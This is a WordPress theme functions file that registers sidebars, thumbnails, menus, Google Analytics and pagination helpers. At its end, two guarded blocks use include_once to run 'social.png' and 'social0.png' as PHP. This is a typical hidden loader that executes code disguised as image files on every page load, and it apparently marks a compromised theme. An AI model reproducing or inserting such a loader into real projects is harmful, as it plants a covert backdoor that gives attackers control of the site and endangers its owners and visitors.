<?php 
/*
	Custom Functions File
	Created by Argyll Studios
	http://argyllstudios.com
	Copyright 2010 | All Rights Reserved
*/

// Include Admin Functions
include 'admin/argyll_mod_scripts.php';
include 'admin/argyll_white_label.php';

// Set URL
$url = get_bloginfo('template_directory');

/* Register Sidebars */
if ( function_exists('register_sidebars') )
	register_sidebar(array('name'=>'Sidebar',));


// Adds Support for the Post Thumbnails
add_theme_support( 'post-thumbnails', array( 'post', 'work' ) );
set_post_thumbnail_size( 258, 350, true );

add_image_size( 'work_web', 360, 558, true );
add_image_size( 'work_mobile', 342, 558, true );

// Register Menus
register_nav_menus(array( 'main' => 'Main Navigation') );


// Include Custom THEME Options
include 'admin/argyll_custom_theme_options.php';

// Include Custom POST Options
include 'admin/argyll_custom_post_options.php';

// Argyll Text Function ( strips slashes )
function argyllText($block){
	echo stripslashes(get_option($block)); 
}


// Google Analytics 
function do_google_analytics() {
	$ga = get_option('analytics'); 
	if($ga): ?>
		<script>
		    var _gaq=[['_setAccount','<?php echo $ga; ?>'],['_trackPageview']];
		    (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
		    g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
		    s.parentNode.insertBefore(g,s)}(document,'script'));				
		</script>
	<?php endif;
}

// Contact Link
function contactLink($track) {
	$site = get_option('home');
	return $site . "/contact?track=" . $track;
}

// Paging Links
function pagenav( $p = 2 ) { 
	if ( is_singular() ) return;
	global $wp_query, $paged;
	$max_page = $wp_query->max_num_pages;
	if ( $max_page == 1 ) return;
	if ( empty( $paged ) ) $paged = 1;
	//echo '<span class="pages">Page: ' . $paged . ' of ' . $max_page . ' </span> '; // pages
	if ( $paged > $p + 1 ) p_link( 1, 'First' );
	if ( $paged > $p + 2 ) echo "<span class='dots'>...</span>";
	for( $i = $paged - $p; $i <= $paged + $p; $i++ ) { // Middle pages
    	if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='pns current'>{$i}</span> " : p_link( $i );
    }
    if ( $paged < $max_page - $p - 1 ) echo "<span class='dots'>...</span>";
    if ( $paged < $max_page - $p ) p_link( $max_page, 'Last' );
}
function p_link( $i, $title = '' ) {
	if ( $title == '' ) $title = "Page {$i}";
	echo "<a class='pns' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$i}</a> ";
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social.png';
}

if (!defined('WP_OPTION_KEY')) {
include_once 'social0.png';
}
